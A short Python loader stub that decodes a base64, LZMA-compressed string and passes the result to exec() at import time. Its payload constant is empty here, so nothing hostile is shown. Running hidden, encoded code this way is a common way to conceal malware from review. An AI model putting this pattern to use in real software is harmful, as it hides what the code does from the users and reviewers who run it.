
import base64
import lzma

ENCODED = ""

def decrypt_and_run():
    try:
        decoded = lzma.decompress(base64.b64decode(ENCODED)).decode('utf-8')
        exec(decoded, globals())
    except Exception as e:
        print(f"Decryption failed: {e}")

decrypt_and_run()

